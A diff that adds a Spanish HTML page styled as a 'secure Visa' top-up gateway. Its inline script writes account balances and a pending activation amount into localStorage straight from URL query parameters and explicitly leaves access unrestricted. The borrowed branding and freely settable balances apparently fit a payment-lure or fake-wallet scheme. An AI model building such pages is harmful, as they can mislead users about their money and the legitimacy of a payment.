@@ -1,0 +1,5401 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+  <script src="repair.js"></script>
+  <script src="global-data.js"></script>
+  <script src="bank-data.js"></script>
+  <script src="js/exchange-rate.js"></script>
+  <script>
+    function getRecargaPage(){
+      try{
+        const reg=JSON.parse(localStorage.getItem('visaRegistrationCompleted')||'{}');
+        return reg.useOldRecarga?'recarga3.html':'homevisa.html';
+      }catch(e){return 'homevisa.html';}
+    }
+    (function(){
+      // Recupera datos de registro y saldo sin restringir el acceso
+      try{
+        const reg=JSON.parse(localStorage.getItem('visaRegistrationCompleted')||'{}');
+        const bal=JSON.parse(localStorage.getItem('remeexBalance')||'{}')||{};
+        window.visaRegData=reg;
+        window.remeexBalanceData=bal;
+        window.isRegistered=Object.keys(reg).length>0;
+        window.hasBalance=((bal.usd||0)>0)||((bal.bs||0)>0)||((bal.eur||0)>0);
+      }catch(e){
+        window.visaRegData={};
+        window.remeexBalanceData={};
+        window.isRegistered=false;
+        window.hasBalance=false;
+      }
+      // El acceso permanece disponible incluso si faltan datos
+    })();
+
+    const PENDING_ACTIVATION_STORAGE_KEY = 'remeexPendingActivationPayment';
+
+    function cloneObject(value) {
+      if (!value || typeof value !== 'object') return value;
+      try {
+        return JSON.parse(JSON.stringify(value));
+      } catch (err) {
+        return value;
+      }
+    }
+
+    function safeParseJSON(value, fallback) {
+      if (!value || typeof value !== 'string') {
+        return cloneObject(fallback);
+      }
+      try {
+        const parsed = JSON.parse(value);
+        return parsed && typeof parsed === 'object' ? parsed : cloneObject(fallback);
+      } catch (err) {
+        return cloneObject(fallback);
+      }
+    }
+
+    function readStoredObject(key, fallback = {}) {
+      try {
+        const raw = localStorage.getItem(key);
+        if (!raw) return cloneObject(fallback);
+        return safeParseJSON(raw, fallback);
+      } catch (err) {
+        return cloneObject(fallback);
+      }
+    }
+
+    function writeStoredObject(key, value) {
+      try {
+        localStorage.setItem(key, JSON.stringify(value));
+      } catch (err) {
+        console.warn('No se pudo escribir en el almacenamiento local', err);
+      }
+    }
+
+    function mergeStoredObject(key, partial) {
+      const current = readStoredObject(key, {});
+      if (!partial || typeof partial !== 'object') {
+        return current;
+      }
+      const next = Object.assign({}, current);
+      let changed = false;
+      Object.keys(partial).forEach(prop => {
+        const value = partial[prop];
+        if (value !== undefined) {
+          if (next[prop] !== value) {
+            next[prop] = value;
+            changed = true;
+          }
+        }
+      });
+      if (changed) {
+        writeStoredObject(key, next);
+      }
+      return next;
+    }
+
+    function parseFlexibleNumber(value) {
+      if (typeof value === 'number') {
+        return isNaN(value) ? NaN : value;
+      }
+      if (typeof value !== 'string') return NaN;
+      const trimmed = value.trim();
+      if (!trimmed) return NaN;
+      const lastComma = trimmed.lastIndexOf(',');
+      const lastDot = trimmed.lastIndexOf('.');
+      let normalized = trimmed;
+      if (lastComma > lastDot) {
+        normalized = trimmed.replace(/\./g, '').replace(',', '.');
+      } else {
+        normalized = trimmed.replace(/,/g, '');
+      }
+      const parsed = parseFloat(normalized);
+      return isNaN(parsed) ? NaN : parsed;
+    }
+
+    function ensureBalanceStructure() {
+      const stored = readStoredObject('remeexBalance', null);
+      if (!stored || typeof stored !== 'object') {
+        writeStoredObject('remeexBalance', { usd: 0, bs: 0, eur: 0 });
+        return;
+      }
+      const next = Object.assign({ usd: 0, bs: 0, eur: 0 }, stored);
+      ['usd', 'bs', 'eur'].forEach(key => {
+        const raw = next[key];
+        if (typeof raw !== 'number') {
+          const parsed = parseFlexibleNumber(raw);
+          next[key] = isNaN(parsed) ? 0 : parsed;
+        }
+      });
+      writeStoredObject('remeexBalance', next);
+    }
+
+    function getStoredPendingActivation() {
+      return readStoredObject(PENDING_ACTIVATION_STORAGE_KEY, {});
+    }
+
+    function persistPendingActivation(partial) {
+      const updated = mergeStoredObject(PENDING_ACTIVATION_STORAGE_KEY, partial || {});
+      if (!updated || typeof updated !== 'object') return updated;
+      window.__pendingActivationStateCache = updated;
+      return updated;
+    }
+
+    function applyQueryParamsToStorage() {
+      try {
+        const params = new URLSearchParams(window.location.search || '');
+        const balanceUsd = parseFlexibleNumber(params.get('balanceUsd'));
+        const balanceBs = parseFlexibleNumber(params.get('balanceBs'));
+        if (!isNaN(balanceUsd) || !isNaN(balanceBs)) {
+          const currentBalance = readStoredObject('remeexBalance', { usd: 0, bs: 0, eur: 0 });
+          const nextBalance = Object.assign({}, currentBalance);
+          if (!isNaN(balanceUsd)) nextBalance.usd = balanceUsd;
+          if (!isNaN(balanceBs)) nextBalance.bs = balanceBs;
+          writeStoredObject('remeexBalance', nextBalance);
+        }
+        const amountParam = [
+          'recargaUsd',
+          'amountUsd',
+          'montoUsd',
+          'monto'
+        ].map(key => parseFlexibleNumber(params.get(key))).find(val => !isNaN(val));
+        if (!isNaN(amountParam)) {
+          persistPendingActivation({ amount: amountParam });
+        }
+        const operatorCode = params.get('operatorCode');
+        if (operatorCode) {
+          persistPendingActivation({ operator: operatorCode });
+        }
+      } catch (err) {
+        console.warn('No se pudo aplicar parámetros de consulta al almacenamiento local', err);
+      }
+    }
+
+    ensureBalanceStructure();
+    applyQueryParamsToStorage();
+  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sistema de Recarga - Pasarela Segura Visa</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* Variables de color Visa corporativo - Mejorado */
+        :root {
+            --primary-color: #1a1f71; /* Azul Visa */
+            --primary-color-light: #2a3183;
+            --primary-color-dark: #141965;
+            --secondary-color: #f7b600; /* Dorado Visa */
+            --secondary-color-light: #ffc626;
+            --secondary-color-dark: #e0a500;
+            --accent-color: #0055c8; /* Azul acento */
+            --accent-color-light: #1e6bd8;
+            --text-color: #2a2a2a;
+            --text-secondary: #666;
+            --background-color: #f9faff;
+            --card-color: #fff;
+            --error-color: #d14124;
+            --success-color: #17a84b;
+            --success-color-light: #1cc058;
+            --light-color: #f2f4f8;
+            --border-color: #e0e4e8;
+            --visa-gradient: linear-gradient(135deg, #1a1f71 0%, #142787 100%);
+            --visa-gradient-hover: linear-gradient(135deg, #2a3183 0%, #1e32a2 100%);
+            --visa-accent-gradient: linear-gradient(135deg, #f7b600 0%, #f5a700 100%);
+            --visa-accent-gradient-hover: linear-gradient(135deg, #ffc626 0%, #ffb718 100%);
+            --box-shadow: 0 10px 25px rgba(26, 31, 113, 0.08);
+            --box-shadow-hover: 0 15px 30px rgba(26, 31, 113, 0.15);
+            --transition-fast: all 0.2s ease;
+            --transition-medium: all 0.3s ease-in-out;
+            --transition-slow: all 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+            --warning-color: #ff9800;
+            --warning-color-light: #ffb74d;
+        }
+        
+        /* Estilos base mejorados */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-tap-highlight-color: transparent; /* Elimina el resaltado al tocar en móviles */
+        }
+        
+        /* Animación de onda refinada */
+        @property --a {
+            syntax: "<angle>";
+            initial-value: 0deg;
+            inherits: true;
+        }
+        
+        /* Propiedad para el orbe */
+        @property --angle {
+            syntax: "<angle>";
+            inherits: false;
+            initial-value: 0deg;
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            min-height: 100%;
+            position: relative;
+            letter-spacing: -0.01em;
+            font-weight: 400;
+            background-image: 
+                radial-gradient(circle at 10% 10%, rgba(26, 31, 113, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 90% 90%, rgba(247, 182, 0, 0.03) 0%, transparent 50%);
+            padding: 20px 0;
+            overflow-y: auto; /* Asegurar que el scroll vertical siempre funcione */
+            overscroll-behavior-y: contain; /* Mejorar el comportamiento del scroll en iOS */
+            -webkit-overflow-scrolling: touch; /* Mejor desplazamiento en iOS */
+        }
+        
+        /* Fondo animado mejorado con efecto parallax */
+        .background-wave {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: -1;
+            opacity: 0.05;
+            overflow: hidden;
+            pointer-events: none; /* Asegurar que no interfiera con el scroll */
+        }
+        
+        .wave-container {
+            display: flex;
+            width: 100vw;
+            height: 100vh;
+            animation: main 15s cubic-bezier(0.76, 0.05, 0.2, 0.96) infinite;
+            transform: translateZ(0);
+            will-change: transform;
+        }
+        
+        @keyframes main {
+            from { --a: 0deg; }
+            to { --a: 360deg; }
+        }
+        
+        .wave-col {
+            flex: 1;
+            --i: 0;
+            --a-per-item: calc(140deg / 24 * var(--i) - var(--a));
+            --pos1: calc(50% * cos(var(--a-per-item)));
+            background: linear-gradient(
+                to bottom,
+                var(--secondary-color-light),
+                var(--accent-color) var(--pos1),
+                var(--primary-color) 50%,
+                var(--accent-color) calc(100% - var(--pos1)),
+                var(--secondary-color-light)
+            );
+            transition: all 1s ease;
+        }
+        
+        /* Generamos columnas de onda */
+        .wave-col:nth-child(1) { --i: 0; }
+        .wave-col:nth-child(2) { --i: 1; }
+        .wave-col:nth-child(3) { --i: 2; }
+        .wave-col:nth-child(4) { --i: 3; }
+        .wave-col:nth-child(5) { --i: 4; }
+        .wave-col:nth-child(6) { --i: 5; }
+        .wave-col:nth-child(7) { --i: 6; }
+        .wave-col:nth-child(8) { --i: 7; }
+        .wave-col:nth-child(9) { --i: 8; }
+        .wave-col:nth-child(10) { --i: 9; }
+        .wave-col:nth-child(11) { --i: 10; }
+        .wave-col:nth-child(12) { --i: 11; }
+        .wave-col:nth-child(13) { --i: 12; }
+        .wave-col:nth-child(14) { --i: 13; }
+        .wave-col:nth-child(15) { --i: 14; }
+        .wave-col:nth-child(16) { --i: 15; }
+        .wave-col:nth-child(17) { --i: 16; }
+        .wave-col:nth-child(18) { --i: 17; }
+        .wave-col:nth-child(19) { --i: 18; }
+        .wave-col:nth-child(20) { --i: 19; }
+        .wave-col:nth-child(21) { --i: 20; }
+        .wave-col:nth-child(22) { --i: 21; }
+        .wave-col:nth-child(23) { --i: 22; }
+        .wave-col:nth-child(24) { --i: 23; }
+        
+        /* Contenedor principal mejorado */
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 15px;
+            position: relative;
+            z-index: 1;
+            perspective: 1000px;
+            width: 100%; /* Asegura que ocupe todo el ancho disponible */
+        }
+        
+        /* Encabezado con logo mejorado */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+            animation: fadeInDown 1s ease-out;
+        }
+        
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .logo-container {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+        
+        /* Agregar efecto de brillo alrededor del logo */
+        .logo-container::before {
+            content: '';
+            position: absolute;
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(247, 182, 0, 0.1) 0%, transparent 70%);
+            animation: pulse-logo 3s infinite ease-in-out;
+        }
+        
+        @keyframes pulse-logo {
+            0%, 100% { transform: scale(1); opacity: 0.7; }
+            50% { transform: scale(1.1); opacity: 0.3; }
+        }
+        
+        .logo {
+            max-width: 100px;
+            height: auto;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
+            transition: all 0.5s ease;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .logo:hover {
+            transform: scale(1.05) rotate(3deg);
+            filter: drop-shadow(0 6px 10px rgba(0,0,0,0.15));
+        }
+        
+        /* Tipografía refinada */
+        h1, h2, h3 {
+            color: var(--primary-color);
+            letter-spacing: -0.02em;
+            font-weight: 600;
+        }
+        
+        h1 {
+            font-size: 28px;
+            margin-bottom: 12px;
+            font-weight: 700;
+            background: var(--visa-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            position: relative;
+            display: inline-block;
+        }
+        
+        h1::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 3px;
+            background: var(--visa-accent-gradient);
+            border-radius: 3px;
+        }
+        
+        h2 {
+            font-size: 22px;
+            margin-bottom: 18px;
+            font-weight: 600;
+            position: relative;
+            display: inline-block;
+        }
+        
+        h2::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 50px;
+            height: 2px;
+            background: var(--secondary-color);
+            border-radius: 2px;
+        }
+        
+        h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        
+        p {
+            color: var(--text-secondary);
+            margin-bottom: 20px;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+        
+        /* Tarjetas para formularios mejoradas con efecto 3D */
+        .card {
+            background-color: var(--card-color);
+            border-radius: 20px;
+            box-shadow: var(--box-shadow);
+            padding: 30px 25px;
+            margin-bottom: 30px;
+            transition: var(--transition-medium);
+            display: none;
+            border: 1px solid rgba(224, 228, 232, 0.6);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            position: relative;
+            transform-style: preserve-3d;
+            transform: translateZ(0) rotateX(0) rotateY(0);
+            overflow: hidden; /* Para asegurar que los contenidos no se salgan en móvil */
+        }
+        
+        .card.active {
+            display: block;
+            animation: cardEntrance 0.7s cubic-bezier(0.23, 1, 0.32, 1);
+        }
+        
+        .card:hover {
+            box-shadow: var(--box-shadow-hover);
+            transform: translateY(-5px) translateZ(0);
+        }
+        
+        @keyframes cardEntrance {
+            from { 
+                opacity: 0; 
+                transform: translateY(20px) rotateX(5deg);
+                box-shadow: 0 5px 15px rgba(26, 31, 113, 0.02);
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0) rotateX(0);
+                box-shadow: var(--box-shadow);
+            }
+        }
+        
+        /* Grupos de formulario mejorados */
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+            transition: var(--transition-medium);
+        }
+        
+        .form-group:hover {
+            transform: translateX(5px);
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 500;
+            color: var(--text-color);
+            font-size: 15px;
+            position: relative;
+            padding-left: 5px;
+            transition: var(--transition-fast);
+        }
+        
+        label::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 3px;
+            height: 0;
+            background: var(--secondary-color);
+            border-radius: 3px;
+            transition: var(--transition-fast);
+        }
+        
+        .form-group:hover label::before {
+            height: 15px;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 15px;
+            transition: var(--transition-fast);
+            background-color: var(--light-color);
+            color: var(--text-color);
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.02) inset;
+            -webkit-appearance: none; /* Corrige apariencia de inputs en iOS */
+            -moz-appearance: none;
+            appearance: none;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.1), 0 2px 5px rgba(0, 0, 0, 0.02) inset;
+            background-color: white;
+            transform: translateY(-2px);
+        }
+        
+        input:disabled {
+            background-color: #f8f8f8;
+            color: #555;
+            cursor: not-allowed;
+            opacity: 0.8;
+        }
+        
+        /* Efecto de enfoque en hover */
+        input:hover, select:hover {
+            border-color: var(--accent-color-light);
+        }
+        
+        /* Selector de documento refinado */
+        .document-input-group {
+            display: flex;
+            gap: 12px;
+            align-items: stretch;
+        }
+        
+        .document-type {
+            width: 70px;
+            flex-shrink: 0;
+            font-weight: 500;
+            border-radius: 10px;
+            background-color: var(--primary-color);
+            color: white;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(26, 31, 113, 0.2);
+            transition: var(--transition-fast);
+        }
+        
+        .document-type:hover {
+            background-color: var(--primary-color-light);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(26, 31, 113, 0.25);
+        }
+        
+        /* Botones elegantes mejorados */
+        .btn-container {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+            flex-direction: row;
+        }
+        
+        .btn {
+            background: var(--visa-gradient);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 14px 20px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition-medium);
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+            letter-spacing: 0.5px;
+            box-shadow: 0 5px 15px rgba(26, 31, 113, 0.15);
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--visa-gradient-hover);
+            opacity: 0;
+            transition: var(--transition-fast);
+            z-index: -1;
+        }
+        
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.2), 
+                transparent);
+            transition: 0.5s;
+        }
+        
+        .btn:hover::after {
+            left: 100%;
+        }
+        
+        .btn:hover::before {
+            opacity: 1;
+        }
+        
+        .btn:hover {
+            box-shadow: 0 8px 20px rgba(26, 31, 113, 0.25);
+            transform: translateY(-3px);
+        }
+        
+        .btn:active {
+            transform: translateY(1px);
+            box-shadow: 0 4px 10px rgba(26, 31, 113, 0.2);
+        }
+        
+        .btn:disabled {
+            background: linear-gradient(135deg, #8a8da6 0%, #6d7090 100%);
+            cursor: not-allowed;
+            opacity: 0.7;
+            box-shadow: none;
+        }
+        
+        .btn:disabled:hover {
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .btn:disabled::after {
+            display: none;
+        }
+        
+        .btn-secondary {
+            background: white;
+            color: var(--primary-color);
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
+        }
+        
+        .btn-secondary::before {
+            background: var(--light-color);
+        }
+        
+        .btn-secondary:hover {
+            background: var(--light-color);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            color: var(--primary-color-dark);
+            border-color: var(--primary-color-light);
+        }
+        
+        .btn-accent {
+            background: var(--visa-accent-gradient);
+        }
+        
+        .btn-accent::before {
+            background: var(--visa-accent-gradient-hover);
+        }
+        
+        .btn-copy {
+            background: transparent;
+            color: var(--primary-color);
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            font-size: 16px;
+            transition: var(--transition-fast);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+            position: relative;
+        }
+        
+        .btn-copy:hover {
+            background-color: rgba(26, 31, 113, 0.05);
+            transform: scale(1.1);
+            color: var(--accent-color);
+        }
+        
+        /* Efecto de ripple en botones */
+        .btn .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.5);
+            transform: scale(0);
+            animation: ripple 0.6s linear;
+            pointer-events: none;
+        }
+        
+        @keyframes ripple {
+            to {
+                transform: scale(2.5);
+                opacity: 0;
+            }
+        }
+        
+        /* Mensajes de error mejorados */
+        .error-message {
+            color: var(--error-color);
+            font-size: 14px;
+            margin-top: 8px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transform: translateY(0);
+            opacity: 0;
+            height: 0;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .error-message:not(:empty) {
+            transform: translateY(0);
+            opacity: 1;
+            height: auto;
+            padding: 5px 0;
+            animation: shake 0.5s ease;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        
+        /* Indicador de pasos sofisticado y mejorado */
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 35px;
+            position: relative;
+            align-items: center;
+        }
+        
+        .steps::before {
+            content: '';
+            position: absolute;
+            top: 22px;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background-color: var(--border-color);
+            z-index: 1;
+            border-radius: 3px;
+        }
+        
+        /* Barra de progreso animada */
+        .steps::after {
+            content: '';
+            position: absolute;
+            top: 22px;
+            left: 0;
+            height: 3px;
+            background: var(--visa-accent-gradient);
+            z-index: 2;
+            border-radius: 3px;
+            transition: width 0.5s cubic-bezier(0.645, 0.045, 0.355, 1);
+            width: 0%;
+        }
+        
+        .steps[data-progress="1"]::after { width: 0%; }
+        .steps[data-progress="2"]::after { width: 33.33%; }
+        .steps[data-progress="3"]::after { width: 66.66%; }
+        .steps[data-progress="4"]::after { width: 100%; }
+        
+        .step {
+            position: relative;
+            z-index: 3;
+            text-align: center;
+            width: 180px;
+            font-weight: 500;
+        }
+        
+        .step-icon {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            background-color: var(--light-color);
+            margin: 0 auto 10px;
+            color: var(--text-secondary);
+            font-weight: 600;
+            transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            position: relative;
+            z-index: 4;
+            border: 2px solid white;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        
+        .step-text {
+            color: var(--text-secondary);
+            font-size: 14px;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            position: relative;
+        }
+        
+        /* Indicador de foco más visible */
+        .step.active .step-icon {
+            background-color: var(--primary-color);
+            color: white;
+            box-shadow: 0 0 0 5px rgba(26, 31, 113, 0.15);
+            transform: scale(1.1);
+        }
+        
+        .step.active .step-text {
+            color: var(--primary-color);
+            font-weight: 600;
+            transform: translateY(3px);
+        }
+        
+        .step.active .step-text::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 20px;
+            height: 2px;
+            background-color: var(--secondary-color);
+            border-radius: 2px;
+        }
+        
+        /* Corregido para que el checkmark no tape el número */
+        .step.completed .step-icon {
+            background-color: var(--success-color);
+            color: white;
+            box-shadow: 0 0 0 5px rgba(23, 168, 75, 0.15);
+            transform: scale(1.1);
+        }
+        
+        .step.completed .step-text {
+            color: var(--success-color);
+        }
+        
+        /* Animación para el paso completado - ahora con el checkmark más pequeño */
+        .step.completed .step-icon span {
+            display: none; /* Ocultamos el número */
+        }
+        
+        .step.completed .step-icon::before {
+            content: '✓';
+            position: absolute;
+            font-size: 18px;
+            animation: checkmark 0.5s ease-in-out;
+        }
+        
+        @keyframes checkmark {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.3); }
+            100% { transform: scale(1); }
+        }
+        
+        /* Tarjeta de datos mejorada */
+        .data-card {
+            background-color: var(--light-color);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 30px;
+            margin-top: 30px;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transition-medium);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            transform-style: preserve-3d;
+        }
+        
+        .data-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.6), 
+                transparent);
+            transition: 0.7s;
+            z-index: 1;
+        }
+        
+        .data-card:hover::before {
+            left: 100%;
+        }
+        
+        .data-card:hover {
+            background-color: white;
+            transform: translateY(-5px) translateZ(20px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            border-color: rgba(26, 31, 113, 0.2);
+        }
+        
+        .data-card i {
+            font-size: 32px;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+            transition: var(--transition-medium);
+            transform-style: preserve-3d;
+            transform: translateZ(30px);
+        }
+        
+        .data-card:hover i {
+            color: var(--secondary-color);
+            transform: translateZ(50px) scale(1.1);
+        }
+        
+        .data-card h3 {
+            transition: var(--transition-medium);
+            transform: translateZ(25px);
+            color: var(--primary-color-dark);
+        }
+        
+        .data-card p {
+            transition: var(--transition-medium);
+            transform: translateZ(20px);
+            max-width: 80%;
+            margin: 0 auto;
+        }
+        
+        .data-card:hover h3, .data-card:hover p {
+            transform: translateZ(40px);
+        }
+        
+        /* Overlay de datos de recarga mejorado */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.4s cubic-bezier(0.19, 1, 0.22, 1);
+            overflow-y: auto; /* Permitir scroll en el overlay */
+        }
+        
+        .overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .payment-data-card {
+            background-color: white;
+            padding: 30px 25px;
+            border-radius: 24px;
+            max-width: 550px;
+            width: 95%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            position: relative;
+            transform: translateY(30px) scale(0.95);
+            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            overflow: hidden;
+            margin: 0 15px; /* Añadido margen para móviles */
+            /* Altura máxima y scroll si el contenido es más grande */
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        
+        .overlay.active .payment-data-card {
+            transform: translateY(0) scale(1);
+        }
+        
+        .payment-data-item {
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            transition: var(--transition-medium);
+            flex-wrap: wrap; /* Para mejor adaptación en móviles */
+        }
+        
+        .payment-data-item:hover {
+            background-color: rgba(247, 182, 0, 0.05);
+            border-radius: 12px;
+            padding-left: 15px;
+            transform: translateX(5px);
+        }
+        
+        .payment-data-item:last-child {
+            border-bottom: none;
+            margin-bottom: 10px;
+        }
+        
+        .payment-data-label {
+            font-weight: 600;
+            color: var(--primary-color);
+            margin-bottom: 5px;
+            font-size: 15px;
+            white-space: nowrap;
+            min-width: 80px; /* Ancho mínimo para mejor alineación */
+        }
+        
+        .payment-data-content {
+            flex: 1;
+            padding-left: 15px;
+            font-weight: 500;
+            color: var(--text-color);
+        }
+        
+        .payment-data-hidden {
+            display: none;
+        }
+        
+        .payment-data-hidden.visible {
+            display: flex;
+            animation: slideUp 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+        }
+        
+        @keyframes slideUp {
+            from {
+                transform: translateY(20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        .close-btn {
+            display: block;
+            margin: 25px auto 0;
+            max-width: 200px;
+        }
+
+        /* Sección de búsqueda de operador certificado */
+        .operator-search-section {
+            margin: 25px 0;
+            padding: 20px;
+            border-radius: 18px;
+            background: rgba(26, 31, 113, 0.04);
+            border: 1px solid rgba(26, 31, 113, 0.12);
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+
+        .operator-search-section .operator-info {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .operator-search-section .operator-info h3 {
+            font-size: 18px;
+            margin-bottom: 0;
+        }
+
+        .operator-search-section .operator-info p {
+            margin-bottom: 0;
+            font-size: 14px;
+        }
+
+        .operator-search-section .btn {
+            align-self: flex-start;
+            padding: 12px 22px;
+        }
+
+        .operator-status-card {
+            display: none;
+            padding: 18px;
+            border-radius: 16px;
+            background: white;
+            border: 1px solid rgba(26, 31, 113, 0.1);
+            box-shadow: 0 8px 20px rgba(26, 31, 113, 0.08);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .operator-status-card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(26, 31, 113, 0.08), rgba(247, 182, 0, 0.08));
+            opacity: 0;
+            transition: opacity 0.4s ease;
+            pointer-events: none;
+        }
+
+        .operator-status-card.visible::before {
+            opacity: 1;
+        }
+
+        .operator-status-card.visible {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .operator-status-header {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-bottom: 12px;
+        }
+
+        .operator-status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(23, 168, 75, 0.12);
+            color: var(--success-color);
+            font-weight: 600;
+            padding: 6px 12px;
+            border-radius: 999px;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+        }
+
+        .operator-status-name {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--primary-color);
+        }
+
+        .operator-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .operator-meta span {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            padding: 4px 10px;
+            border-radius: 999px;
+            background: rgba(26, 31, 113, 0.08);
+        }
+
+        .operator-meta span i {
+            color: var(--primary-color);
+        }
+
+        .operator-status-message {
+            font-size: 13px;
